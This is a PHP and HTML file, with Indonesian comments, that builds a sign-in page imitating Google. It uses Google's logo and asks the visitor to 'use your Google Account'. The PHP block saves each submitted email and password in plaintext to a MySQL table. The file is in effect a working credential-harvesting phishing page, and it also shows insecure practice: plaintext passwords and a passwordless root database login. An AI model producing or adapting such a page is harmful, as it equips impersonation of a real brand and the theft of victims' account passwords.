<?php
// Periksa jika form disubmit
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    
    // Cek jika email dan password ada dalam $_POST dan tidak kosong
    if (isset($_POST['email']) && !empty($_POST['email']) && isset($_POST['password']) && !empty($_POST['password'])) {

        // Koneksi ke database
        $host = "localhost";
        $user = "root";
        $password = ""; // Ganti dengan password database Anda
        $database = "user_data";

        $conn = new mysqli($host, $user, $password, $database);

        // Periksa koneksi
        if ($conn->connect_error) {
            die("Koneksi gagal: " . $conn->connect_error);
        }

        // Ambil data dari form
        $email = $_POST['email'];
        $password = $_POST['password'];

        // Simpan data ke database
        $sql = "INSERT INTO users (email, password) VALUES (?, ?)";
        $stmt = $conn->prepare($sql);
        $stmt->bind_param("ss", $email, $password);

        if ($stmt->execute()) {
            echo "Data berhasil disimpan.";
        } else {
            echo "Error: " . $stmt->error;
        }

        // Tutup koneksi
        $stmt->close();
        $conn->close();
    } else {
        echo "Email dan password tidak boleh kosong.";
    }
}
?>

<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Bergaya Google</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f5f5f5;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .form-container {
            background: #fff;
            padding: 40px;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
            text-align: center;
            width: 360px;
        }
        .form-container img {
            width: 75px;
            margin-bottom: 20px;
        }
        .form-container h1 {
            font-size: 24px;
            color: #202124;
            margin-bottom: 8px;
        }
        .form-container p {
            font-size: 14px;
            color: #5f6368;
            margin-bottom: 20px;
        }
        .form-group {
            margin-bottom: 15px;
            text-align: left;
        }
        .form-group label {
            display: block;
            font-size: 14px;
            color: #202124;
            margin-bottom: 5px;
        }
        .form-group input {
            width: 100%;
            padding: 10px;
            font-size: 16px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            box-sizing: border-box;
        }
        .form-group button {
            width: 100%;
            padding: 10px;
            font-size: 16px;
            color: #fff;
            background-color: #1a73e8;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            text-transform: uppercase;
        }
        .form-group button:hover {
            background-color: #1669c1;
        }
        .form-container .divider {
            margin: 20px 0;
            text-align: center;
            color: #5f6368;
            font-size: 12px;
        }
        .form-container .divider::before,
        .form-container .divider::after {
            content: "";
            display: inline-block;
            width: 30%;
            height: 1px;
            background-color: #dadce0;
            vertical-align: middle;
            margin: 0 10px;
        }
    </style>
</head>
<body>
    <div class="form-container">
        <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Logo Google">
        <h1>Masuk</h1>
        <p>Gunakan Akun Google Anda</p>
        <form action="" method="POST"> <!-- Form disubmit ke halaman yang sama -->
            <div class="form-group">
                <label for="email">Email</label>
                <input type="email" id="email" name="email" required>
            </div>
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" required>
            </div>
            <div class="form-group">
                <button type="submit">Kirim</button>
            </div>
        </form>
    </div>
</body>
</html>
